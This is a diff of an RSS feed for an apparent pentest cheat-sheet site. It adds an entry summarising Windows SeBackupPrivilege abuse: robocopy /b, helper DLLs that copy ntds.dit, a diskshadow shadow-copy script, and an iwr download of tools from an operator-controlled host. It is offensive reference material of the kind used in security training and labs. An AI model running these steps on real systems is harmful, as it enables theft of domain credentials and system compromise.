@@ -8,7 +8,14 @@
     <language>en-us</language>
     <atom:link href="https://tldrbins.github.io/@system/index.xml" rel="self" type="application/rss+xml" />
     <item>
-      <title>secretsdump</title>
+      <title>SeBackupPrivilege/SeRestorePrivilege</title>
+      <link>https://tldrbins.github.io/sebackupprivilege/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/sebackupprivilege/</guid>
+      <description>Abuse #1: Robocopy robocopy /b &amp;lt;TARGET_DIR_PATH&amp;gt; &amp;lt;DEST_DIR&amp;gt; &amp;lt;TARGET_FILE&amp;gt; Abuse #2: Use Helper DLLs 1. Import Helper Modules import-module .\SeBackupPrivilegeCmdLets.dll import-module .\SeBackupPrivilegeUtils.dll 2. Copy Target File Copy-FileSeBackupPrivilege &amp;#39;&amp;lt;TARGET_FILE_PATH&amp;gt;&amp;#39; &amp;#39;C:\ProgramData\&amp;lt;TARGET_FILE&amp;gt;&amp;#39; Copy-FileSeBackupPrivilege C:\Windows\ntds\ntds.dit C:\ProgramData\ntds.dit Ref: SeBackupPrivilegeUtils.dll Ref: SeBackupPrivilegeCmdLets.dll&#xA;Abuse #3: Diskshadow 1. Create a .dsh File set context persistent nowriters set metadata C:\ProgramData\test.cab set verbose on add volume c: alias test create expose %test% x: 2. Convert to DOS Format unix2dos vss.dsh 3. Upload Helpers iwr http://&amp;lt;LOCAL_IP&amp;gt;:&amp;lt;LOCAL_PORT&amp;gt;/SeBackupPrivilegeCmdLets.</description>
+    </item>
+    <item>
+      <title>Secrets Dump</title>
       <link>https://tldrbins.github.io/secretsdump/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/secretsdump/</guid>
